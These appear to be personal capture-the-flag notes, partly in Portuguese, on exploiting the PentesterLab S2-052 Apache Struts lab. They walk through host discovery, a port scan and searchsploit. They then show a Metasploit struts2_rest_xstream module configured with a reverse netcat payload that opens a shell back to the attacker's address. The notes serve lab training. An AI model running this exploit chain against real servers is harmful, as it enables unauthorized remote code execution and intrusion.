Scanning:
netdiscover
http://192.168.1.107


Portas/serviços:
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1 (Struts!!!!!)


Procura exploit:
searchsploit tomcat
Há muito exploits que poderiam ser usados!!!!!


Metasploit:
search struts2 rest xtream
exploit/multi/http/struts2_rest_xstream 

Module options (exploit/multi/http/struts2_rest_xstream):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.1.107    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT      80               yes       The target port (TCP)
   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT    8080             yes       The local port to listen on.
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /orders/3        yes       Path to Struts action
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.105    yes       The listen address (an interface may be specified)
   LPORT  443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Unix (In-Memory)



Links:
https://www.vulnhub.com/entry/pentester-lab-s2-052,206/
https://pentesterlab.com/exercises/s2-052/course
https://www.exploit-db.com/exploits/42627
https://www.sangfor.com/source/blog-network-security/842.html#:~:text=Apache%20released%20a%20security%20bulletin,handler%20to%20deserialize%20XML%20requests
https://www.youtube.com/watch?v=tMxnFvCV9yY


